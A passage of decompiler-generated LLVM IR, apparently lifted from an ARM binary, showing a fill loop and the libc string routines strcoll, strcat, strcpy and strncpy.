  %v2_1262c = add i32 %v0_12638.pr.pre, -1
  store i32 %v2_1262c, i32* @r2, align 4
  %v1_12624 = urem i32 %v6_12628, 4
  %v2_12624 = icmp eq i32 %v1_12624, 0
  store i1 %v2_12624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12624, label %dec_label_pc_12634, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12628.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_12628.pre to i8
  br label %bb

dec_label_pc_12634:                               ; preds = %.thread, %bb, %dec_label_pc_1261c
  %v0_1264028 = phi i32 [ %v0_12610, %dec_label_pc_1261c ], [ %v6_12628, %bb ], [ %v6_12628, %.thread ]
  %v0_12638.pr = phi i32 [ %v0_12614, %dec_label_pc_1261c ], [ %v0_12638.pr.pre, %bb ], [ %v2_1262c, %.thread ]
  %v0_12634 = load i32, i32* @r1, align 4
  store i32 %v0_12634, i32* %ip.global-to-local, align 4
  %v8_1263810 = icmp eq i32 %v0_12638.pr, 8
  store i1 %v8_1263810, i1* %cpsr_z.global-to-local, align 1
  %v5_1263c11 = icmp slt i32 %v0_12638.pr, 8
  br i1 %v5_1263c11, label %dec_label_pc_12678, label %dec_label_pc_12640.preheader

dec_label_pc_12640.preheader:                     ; preds = %dec_label_pc_12634
  %v1_1264046 = inttoptr i32 %v0_1264028 to i32*
  store i32 %v0_12634, i32* %v1_1264046, align 4
  %v3_1264047 = add i32 %v0_1264028, 4
  %v4_1264048 = inttoptr i32 %v3_1264047 to i32*
  %v5_1264049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1264049, i32* %v4_1264048, align 4
  %v6_1264050 = add i32 %v0_1264028, 8
  store i32 %v6_1264050, i32* %r3.global-to-local, align 4
  %v0_1264451 = load i32, i32* @r2, align 4
  %v1_1264452 = add i32 %v0_1264451, -8
  store i32 %v1_1264452, i32* %r2.global-to-local, align 4
  %v5_1264c53 = icmp slt i32 %v1_1264452, 8
  br i1 %v5_1264c53, label %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12650

dec_label_pc_12650:                               ; preds = %dec_label_pc_12640.preheader, %dec_label_pc_12638.dec_label_pc_12640_crit_edge
  %v6_1264055 = phi i32 [ %v6_12640, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ], [ %v6_1264050, %dec_label_pc_12640.preheader ]
  %v0_1264054 = phi i32 [ %v12_1266c, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ], [ %v0_1264028, %dec_label_pc_12640.preheader ]
  %v1_12650 = inttoptr i32 %v6_1264055 to i32*
  %v2_12650 = load i32, i32* @r1, align 4
  store i32 %v2_12650, i32* %v1_12650, align 4
  %v3_12650 = add i32 %v0_1264054, 12
  %v4_12650 = inttoptr i32 %v3_12650 to i32*
  %v5_12650 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12650, i32* %v4_12650, align 4
  %v6_12650 = add i32 %v0_1264054, 16
  store i32 %v6_12650, i32* %r3.global-to-local, align 4
  %v0_12654 = load i32, i32* %r2.global-to-local, align 4
  %v1_12654 = add i32 %v0_12654, -8
  store i32 %v1_12654, i32* %r2.global-to-local, align 4
  %v5_1265c = icmp slt i32 %v1_12654, 8
  br i1 %v5_1265c, label %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12650
  %v1_12660 = inttoptr i32 %v6_12650 to i32*
  %v2_12660 = load i32, i32* @r1, align 4
  store i32 %v2_12660, i32* %v1_12660, align 4
  %v3_12660 = add i32 %v0_1264054, 20
  %v4_12660 = inttoptr i32 %v3_12660 to i32*
  %v5_12660 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12660, i32* %v4_12660, align 4
  %v6_12660 = add i32 %v0_1264054, 24
  store i32 %v6_12660, i32* %r3.global-to-local, align 4
  %v0_12664 = load i32, i32* %r2.global-to-local, align 4
  %v1_12664 = add i32 %v0_12664, -8
  store i32 %v1_12664, i32* %r2.global-to-local, align 4
  %v5_1266c = icmp slt i32 %v1_12664, 8
  br i1 %v5_1266c, label %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %dec_label_pc_12660
  %v7_1266c = inttoptr i32 %v6_12660 to i32*
  %v8_1266c = load i32, i32* @r1, align 4
  store i32 %v8_1266c, i32* %v7_1266c, align 4
  %v9_1266c = add i32 %v0_1264054, 28
  %v10_1266c = inttoptr i32 %v9_1266c to i32*
  %v11_1266c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1266c, i32* %v10_1266c, align 4
  %v12_1266c = add i32 %v0_1264054, 32
  store i32 %v12_1266c, i32* %r3.global-to-local, align 4
  %v6_12670 = load i32, i32* %r2.global-to-local, align 4
  %v7_12670 = add i32 %v6_12670, -8
  store i32 %v7_12670, i32* %r2.global-to-local, align 4
  %v5_1263c = icmp slt i32 %v7_12670, 8
  br i1 %v5_1263c, label %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12638.dec_label_pc_12640_crit_edge

dec_label_pc_12638.dec_label_pc_12640_crit_edge:  ; preds = %dec_label_pc_12638
  %v2_12640.pre = load i32, i32* @r1, align 4
  %v1_12640 = inttoptr i32 %v12_1266c to i32*
  store i32 %v2_12640.pre, i32* %v1_12640, align 4
  %v3_12640 = add i32 %v0_1264054, 36
  %v4_12640 = inttoptr i32 %v3_12640 to i32*
  %v5_12640 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12640, i32* %v4_12640, align 4
  %v6_12640 = add i32 %v0_1264054, 40
  store i32 %v6_12640, i32* %r3.global-to-local, align 4
  %v0_12644 = load i32, i32* %r2.global-to-local, align 4
  %v1_12644 = add i32 %v0_12644, -8
  store i32 %v1_12644, i32* %r2.global-to-local, align 4
  %v5_1264c = icmp slt i32 %v1_12644, 8
  br i1 %v5_1264c, label %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12650

dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12638.dec_label_pc_12640_crit_edge, %dec_label_pc_12640.preheader
  %v1_12644.lcssa = phi i32 [ %v1_1264452, %dec_label_pc_12640.preheader ], [ %v1_12644, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12638
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12650
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12660
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12678:                               ; preds = %dec_label_pc_12634, %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge, %entry
  %v0_12680 = phi i32 [ %v0_12614, %entry ], [ %v1_12664, %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge ], [ %v1_12654, %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge ], [ %v7_12670, %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge ], [ %v1_12644.lcssa, %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge ], [ %v0_12638.pr, %dec_label_pc_12634 ]
  %v2_12678 = icmp eq i32 %v0_12680, 0
  store i1 %v2_12678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12678, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12678
  %v2_1267c = load i32, i32* @r0, align 4
  ret i32 %v2_1267c

bb33:                                             ; preds = %dec_label_pc_12678
  %v1_12680 = sub i32 7, %v0_12680
  store i32 %v1_12680, i32* %r2.global-to-local, align 4
  %v3_12684 = mul i32 %v1_12680, 4
  %v4_12684 = add i32 %v3_12684, ptrtoint (i32* @global_var_1268c.658 to i32)
  call void @__pseudo_branch(i32 %v4_12684)
  %v0_12688 = load i32, i32* @r0, align 4
  %v0_1268c = load i32, i32* @r1, align 4
  %v1_1268c = trunc i32 %v0_1268c to i8
  %v2_1268c = load i32, i32* %r3.global-to-local, align 4
  %v3_1268c = inttoptr i32 %v2_1268c to i8*
  store i8 %v1_1268c, i8* %v3_1268c, align 1
  %v4_1268c = load i32, i32* %r3.global-to-local, align 4
  %v5_1268c = add i32 %v4_1268c, 1
  store i32 %v5_1268c, i32* %r3.global-to-local, align 4
  %v0_12690 = load i32, i32* @r1, align 4
  %v1_12690 = trunc i32 %v0_12690 to i8
  %v3_12690 = inttoptr i32 %v5_1268c to i8*
  store i8 %v1_12690, i8* %v3_12690, align 1
  %v4_12690 = load i32, i32* %r3.global-to-local, align 4
  %v5_12690 = add i32 %v4_12690, 1
  store i32 %v5_12690, i32* %r3.global-to-local, align 4
  %v0_12694 = load i32, i32* @r1, align 4
  %v1_12694 = trunc i32 %v0_12694 to i8
  %v3_12694 = inttoptr i32 %v5_12690 to i8*
  store i8 %v1_12694, i8* %v3_12694, align 1
  %v4_12694 = load i32, i32* %r3.global-to-local, align 4
  %v5_12694 = add i32 %v4_12694, 1
  store i32 %v5_12694, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @r1, align 4
  %v1_12698 = trunc i32 %v0_12698 to i8
  %v3_12698 = inttoptr i32 %v5_12694 to i8*
  store i8 %v1_12698, i8* %v3_12698, align 1
  %v4_12698 = load i32, i32* %r3.global-to-local, align 4
  %v5_12698 = add i32 %v4_12698, 1
  store i32 %v5_12698, i32* %r3.global-to-local, align 4
  %v0_1269c = load i32, i32* @r1, align 4
  %v1_1269c = trunc i32 %v0_1269c to i8
  %v3_1269c = inttoptr i32 %v5_12698 to i8*
  store i8 %v1_1269c, i8* %v3_1269c, align 1
  %v4_1269c = load i32, i32* %r3.global-to-local, align 4
  %v5_1269c = add i32 %v4_1269c, 1
  store i32 %v5_1269c, i32* %r3.global-to-local, align 4
  %v0_126a0 = load i32, i32* @r1, align 4
  %v1_126a0 = trunc i32 %v0_126a0 to i8
  %v3_126a0 = inttoptr i32 %v5_1269c to i8*
  store i8 %v1_126a0, i8* %v3_126a0, align 1
  %v4_126a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_126a0 = add i32 %v4_126a0, 1
  store i32 %v5_126a0, i32* %r3.global-to-local, align 4
  %v0_126a4 = load i32, i32* @r1, align 4
  %v1_126a4 = trunc i32 %v0_126a4 to i8
  %v3_126a4 = inttoptr i32 %v5_126a0 to i8*
  store i8 %v1_126a4, i8* %v3_126a4, align 1
  %v4_126a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_126a4 = add i32 %v4_126a4, 1
  store i32 %v5_126a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_12688

; uselistorder directives
  uselistorder i32 %v6_12640, { 1, 0 }
  uselistorder i32 %v12_1266c, { 1, 2, 0 }
  uselistorder i32 %v0_1264054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12638.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12628, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1261c, { 1, 0 }
  uselistorder i32 %v0_1261c, { 1, 2, 0 }
  uselistorder i32 %v0_12614, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12610, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 5, 3, 4, 1, 8, 7, 0, 9 }
  uselistorder label %dec_label_pc_12678, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12650, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_126b4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_126b4 = phi i32 [ %v0_126b4.pre, %bb ], [ %v5_126b4, %bb3 ]
  %v0_126b0 = phi i32 [ %tmp, %bb ], [ %v5_126b0, %bb3 ]
  %v1_126b0 = inttoptr i32 %v0_126b0 to i8*
  %v2_126b0 = load i8, i8* %v1_126b0, align 1
  %v1_126b4 = inttoptr i32 %v0_126b4 to i8*
  %v2_126b4 = load i8, i8* %v1_126b4, align 1
  %v3_126b4 = zext i8 %v2_126b4 to i32
  %v2_126b8 = icmp eq i8 %v2_126b0, 0
  br i1 %v2_126b8, label %.dec_label_pc_126c4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_126b4 = add i32 %v0_126b4, 1
  %v5_126b0 = add i32 %v0_126b0, 1
  %v3_126b0 = zext i8 %v2_126b0 to i32
  %v10_126bc = icmp eq i8 %v2_126b0, %v2_126b4
  br i1 %v10_126bc, label %entry, label %dec_label_pc_126c4

.dec_label_pc_126c4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %bb3, %.dec_label_pc_126c4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_126c4_crit_edge ], [ %v3_126b0, %bb3 ]
  %v2_126c4.pre-phi = sub nsw i32 %.pn, %v3_126b4
  ret i32 %v2_126c4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_126b0, { 0, 2, 1 }
  uselistorder i32 %v0_126b0, { 1, 0 }
  uselistorder i32 %v0_126b4, { 1, 0 }
  uselistorder label %dec_label_pc_126c4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_12734, %entry
  %v0_12734 = phi i32 [ %v5_12734, %dec_label_pc_12734 ], [ %tmp, %entry ]
  %v1_12734 = inttoptr i32 %v0_12734 to i8*
  %v2_12734 = load i8, i8* %v1_12734, align 1
  %v5_12734 = add i32 %v0_12734, 1
  store i32 %v5_12734, i32* %r2.global-to-local, align 4
  %v2_12738 = icmp eq i8 %v2_12734, 0
  store i1 %v2_12738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12738, label %dec_label_pc_12740, label %dec_label_pc_12734

dec_label_pc_12740:                               ; preds = %dec_label_pc_12734
  %v1_12740 = add i32 %v0_12734, -1
  store i32 %v1_12740, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12744

dec_label_pc_12744:                               ; preds = %dec_label_pc_12744, %dec_label_pc_12740
  %v2_1274c = phi i32 [ %v6_1274c, %dec_label_pc_12744 ], [ %v1_12740, %dec_label_pc_12740 ]
  %v0_12744 = load i32, i32* @r1, align 4
  %v1_12744 = inttoptr i32 %v0_12744 to i8*
  %v2_12744 = load i8, i8* %v1_12744, align 1
  %v5_12744 = add i32 %v0_12744, 1
  store i32 %v5_12744, i32* @r1, align 4
  %v2_12748 = icmp eq i8 %v2_12744, 0
  store i1 %v2_12748, i1* %cpsr_z.global-to-local, align 1
  %v3_1274c = add i32 %v2_1274c, 1
  %v4_1274c = inttoptr i32 %v3_1274c to i8*
  store i8 %v2_12744, i8* %v4_1274c, align 1
  %v5_1274c = load i32, i32* %r2.global-to-local, align 4
  %v6_1274c = add i32 %v5_1274c, 1
  store i32 %v6_1274c, i32* %r2.global-to-local, align 4
  %v0_12750 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12750, label %dec_label_pc_12754, label %dec_label_pc_12744

dec_label_pc_12754:                               ; preds = %dec_label_pc_12744
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_1274c, { 1, 0 }
  uselistorder i32 %v5_12734, { 1, 0 }
  uselistorder i32 %v0_12734, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12758 = sub i32 %arg1, %tmp
  %v1_1275c = add i32 %v2_12758, -1
  store i32 %v1_1275c, i32* %r2.global-to-local, align 4
  %v2_127604 = load i8, i8* %arg2, align 1
  %v5_127606 = add i32 %tmp, 1
  store i32 %v5_127606, i32* %r1.global-to-local, align 4
  %v2_127647 = icmp eq i8 %v2_127604, 0
  store i1 %v2_127647, i1* %cpsr_z.global-to-local, align 1
  %v5_127688 = inttoptr i32 %arg1 to i8*
  store i8 %v2_127604, i8* %v5_127688, align 1
  %v0_1276c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1276c9, label %dec_label_pc_12770, label %dec_label_pc_12760.dec_label_pc_12760_crit_edge

dec_label_pc_12760.dec_label_pc_12760_crit_edge:  ; preds = %entry, %dec_label_pc_12760.dec_label_pc_12760_crit_edge
  %v0_12760.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_12768.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12760 = inttoptr i32 %v0_12760.pre to i8*
  %v2_12760 = load i8, i8* %v1_12760, align 1
  %v5_12760 = add i32 %v0_12760.pre, 1
  store i32 %v5_12760, i32* %r1.global-to-local, align 4
  %v2_12764 = icmp eq i8 %v2_12760, 0
  store i1 %v2_12764, i1* %cpsr_z.global-to-local, align 1
  %v4_12768 = add i32 %v5_12760, %v3_12768.pre
  %v5_12768 = inttoptr i32 %v4_12768 to i8*
  store i8 %v2_12760, i8* %v5_12768, align 1
  %v0_1276c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1276c, label %dec_label_pc_12770, label %dec_label_pc_12760.dec_label_pc_12760_crit_edge

dec_label_pc_12770:                               ; preds = %dec_label_pc_12760.dec_label_pc_12760_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12760.dec_label_pc_12760_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_12774 = icmp eq i32 %arg2, 3
  store i1 %v7_12774, i1* %cpsr_z.global-to-local, align 1
  %v1_1277c = add i32 %arg1, -1
  store i32 %v1_1277c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_127f8, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %entry
  %v3_12784 = udiv i32 %arg2, 4
  store i32 %v3_12784, i32* @lr, align 4
  %v0_12788.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12788

dec_label_pc_12788:                               ; preds = %dec_label_pc_127d4, %dec_label_pc_12784
  %v2_12790 = phi i32 [ %v6_127c8, %dec_label_pc_127d4 ], [ %v1_1277c, %dec_label_pc_12784 ]
  %v0_12788 = phi i32 [ %v1_127d8, %dec_label_pc_127d4 ], [ %v0_12788.pre, %dec_label_pc_12784 ]
  %v1_12788 = inttoptr i32 %v0_12788 to i8*
  %v2_12788 = load i8, i8* %v1_12788, align 1
  %v3_12788 = zext i8 %v2_12788 to i32
  store i32 %v3_12788, i32* %r3.global-to-local, align 4
  %v2_1278c = icmp eq i8 %v2_12788, 0
  store i1 %v2_1278c, i1* %cpsr_z.global-to-local, align 1
  %v3_12790 = add i32 %v2_12790, 1
  %v4_12790 = inttoptr i32 %v3_12790 to i8*
  store i8 %v2_12788, i8* %v4_12790, align 1
  %v5_12790 = load i32, i32* %ip.global-to-local, align 4
  %v6_12790 = add i32 %v5_12790, 1
  store i32 %v6_12790, i32* %ip.global-to-local, align 4
  %v0_12794 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12794, label %dec_label_pc_127e4, label %dec_label_pc_12798

dec_label_pc_12798:                               ; preds = %dec_label_pc_12788
  %v0_12798 = load i32, i32* @r1, align 4
  %v1_12798 = add i32 %v0_12798, 1
  %v2_12798 = inttoptr i32 %v1_12798 to i8*
  %v3_12798 = load i8, i8* %v2_12798, align 1
  %v4_12798 = zext i8 %v3_12798 to i32
  store i32 %v4_12798, i32* %r3.global-to-local, align 4
  %v2_1279c = icmp eq i8 %v3_12798, 0
  store i1 %v2_1279c, i1* %cpsr_z.global-to-local, align 1
  %v3_127a0 = add i32 %v5_12790, 2
  %v4_127a0 = inttoptr i32 %v3_127a0 to i8*
  store i8 %v3_12798, i8* %v4_127a0, align 1
  %v5_127a0 = load i32, i32* %ip.global-to-local, align 4
  %v6_127a0 = add i32 %v5_127a0, 1
  store i32 %v6_127a0, i32* %ip.global-to-local, align 4
  %v0_127a4 = load i32, i32* @r1, align 4
  %v1_127a4 = add i32 %v0_127a4, 1
  store i32 %v1_127a4, i32* %r1.global-to-local, align 4
  %v0_127a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127a8, label %dec_label_pc_127e4, label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %dec_label_pc_12798
  %v1_127ac = add i32 %v0_127a4, 2
  %v2_127ac = inttoptr i32 %v1_127ac to i8*
  %v3_127ac = load i8, i8* %v2_127ac, align 1
  %v4_127ac = zext i8 %v3_127ac to i32
  store i32 %v4_127ac, i32* %r3.global-to-local, align 4
  %v2_127b0 = icmp eq i8 %v3_127ac, 0
  store i1 %v2_127b0, i1* %cpsr_z.global-to-local, align 1
  %v3_127b4 = add i32 %v5_127a0, 2
  %v4_127b4 = inttoptr i32 %v3_127b4 to i8*
  store i8 %v3_127ac, i8* %v4_127b4, align 1
  %v5_127b4 = load i32, i32* %ip.global-to-local, align 4
  %v6_127b4 = add i32 %v5_127b4, 1
  store i32 %v6_127b4, i32* %ip.global-to-local, align 4
  %v0_127b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_127b8 = add i32 %v0_127b8, 1
  store i32 %v1_127b8, i32* %r1.global-to-local, align 4
  %v0_127bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127bc, label %dec_label_pc_127e4, label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127ac
  %v1_127c0 = add i32 %v0_127b8, 2
  %v2_127c0 = inttoptr i32 %v1_127c0 to i8*
  %v3_127c0 = load i8, i8* %v2_127c0, align 1
  %v4_127c0 = zext i8 %v3_127c0 to i32
  store i32 %v4_127c0, i32* %r3.global-to-local, align 4
  %v2_127c4 = icmp eq i8 %v3_127c0, 0
  store i1 %v2_127c4, i1* %cpsr_z.global-to-local, align 1
  %v3_127c8 = add i32 %v5_127b4, 2
  %v4_127c8 = inttoptr i32 %v3_127c8 to i8*
  store i8 %v3_127c0, i8* %v4_127c8, align 1
  %v5_127c8 = load i32, i32* %ip.global-to-local, align 4
  %v6_127c8 = add i32 %v5_127c8, 1
  store i32 %v6_127c8, i32* %ip.global-to-local, align 4
  %v0_127cc = load i32, i32* %r1.global-to-local, align 4
  %v1_127cc = add i32 %v0_127cc, 1
  store i32 %v1_127cc, i32* %r1.global-to-local, align 4
  %v0_127d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127d0, label %dec_label_pc_127e4, label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127c0
  %v0_127d4 = load i32, i32* @lr, align 4
  %v1_127d4 = add i32 %v0_127d4, -1
  store i32 %v1_127d4, i32* @lr, align 4
  %v7_127d4 = icmp eq i32 %v0_127d4, 1
  store i1 %v7_127d4, i1* %cpsr_z.global-to-local, align 1
  %v1_127d8 = add i32 %v0_127cc, 2
  store i32 %v1_127d8, i32* @r1, align 4
  br i1 %v7_127d4, label %dec_label_pc_127f8, label %dec_label_pc_12788

dec_label_pc_127e4:                               ; preds = %dec_label_pc_12798, %dec_label_pc_12788, %dec_label_pc_127c0, %dec_label_pc_127ac
  %v1_127e4 = phi i32 [ %v6_127a0, %dec_label_pc_12798 ], [ %v6_12790, %dec_label_pc_12788 ], [ %v6_127c8, %dec_label_pc_127c0 ], [ %v6_127b4, %dec_label_pc_127ac ]
  %v2_127e41 = sub i32 %arg1, %v1_127e4
  %v2_127e8 = add i32 %v2_127e41, %arg2
  store i32 %v2_127e8, i32* %r3.global-to-local, align 4
  %v1_127ec = add i32 %v2_127e8, -1
  store i32 %v1_127ec, i32* %r2.global-to-local, align 4
  %v7_127ec = icmp eq i32 %v2_127e8, 1
  store i1 %v7_127ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127ec, label %bb, label %dec_label_pc_12818

bb:                                               ; preds = %dec_label_pc_127e4
  ret i32 %arg1

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127d4, %entry
  %v2_128086 = phi i32 [ %v1_1277c, %entry ], [ %v6_127c8, %dec_label_pc_127d4 ]
  %v1_127f8 = urem i32 %arg2, 4
  store i32 %v1_127f8, i32* %r2.global-to-local, align 4
  %v2_127f8 = icmp eq i32 %v1_127f8, 0
  store i1 %v2_127f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_127f8, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_127f8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_127f8, %._crit_edge
  %v2_12808 = phi i32 [ %v6_12808, %._crit_edge ], [ %v2_128086, %dec_label_pc_127f8 ]
  %v0_12804 = phi i32 [ %v0_12804.pre, %._crit_edge ], [ %v1_127f8, %dec_label_pc_127f8 ]
  %v0_12800 = load i32, i32* @r1, align 4
  %v1_12800 = inttoptr i32 %v0_12800 to i8*
  %v2_12800 = load i8, i8* %v1_12800, align 1
  %v3_12800 = zext i8 %v2_12800 to i32
  store i32 %v3_12800, i32* %r3.global-to-local, align 4
  %v5_12800 = add i32 %v0_12800, 1
  store i32 %v5_12800, i32* @r1, align 4
  %v1_12804 = add i32 %v0_12804, -1
  store i32 %v1_12804, i32* %r2.global-to-local, align 4
  %v7_12804 = icmp eq i32 %v0_12804, 1
  store i1 %v7_12804, i1* %cpsr_z.global-to-local, align 1
  %v3_12808 = add i32 %v2_12808, 1
  %v4_12808 = inttoptr i32 %v3_12808 to i8*
  store i8 %v2_12800, i8* %v4_12808, align 1
  %v5_12808 = load i32, i32* %ip.global-to-local, align 4
  %v6_12808 = add i32 %v5_12808, 1
  store i32 %v6_12808, i32* %ip.global-to-local, align 4
  %v0_1280c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1280c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_12810 = load i32, i32* %r3.global-to-local, align 4
  %v2_12810 = icmp eq i32 %v0_12810, 0
  store i1 %v2_12810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12810, label %dec_label_pc_12818, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_12804.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_12818:                               ; preds = %dec_label_pc_127e4, %bb13, %dec_label_pc_12818
  %v2_12820 = phi i32 [ %v6_12820, %dec_label_pc_12818 ], [ %v1_127e4, %dec_label_pc_127e4 ], [ %v6_12808, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1281c = load i32, i32* %r2.global-to-local, align 4
  %v1_1281c = add i32 %v0_1281c, -1
  store i32 %v1_1281c, i32* %r2.global-to-local, align 4
  %v7_1281c = icmp eq i32 %v0_1281c, 1
  store i1 %v7_1281c, i1* %cpsr_z.global-to-local, align 1
  %v3_12820 = add i32 %v2_12820, 1
  %v4_12820 = inttoptr i32 %v3_12820 to i8*
  store i8 0, i8* %v4_12820, align 1
  %v5_12820 = load i32, i32* %ip.global-to-local, align 4
  %v6_12820 = add i32 %v5_12820, 1
  store i32 %v6_12820, i32* %ip.global-to-local, align 4
  %v0_12824 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12824, label %dec_label_pc_12828, label %dec_label_pc_12818

dec_label_pc_12828:                               ; preds = %dec_label_pc_12818
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_12820, { 1, 0 }
  uselistorder i32 %v0_1281c, { 1, 0 }
  uselistorder i32 %v6_12808, { 0, 2, 1 }
  uselistorder i32 %v1_127f8, { 2, 1, 0 }
  uselistorder i32 %v2_127e8, { 2, 1, 0 }
  uselistorder i32 %v1_127d8, { 1, 0 }
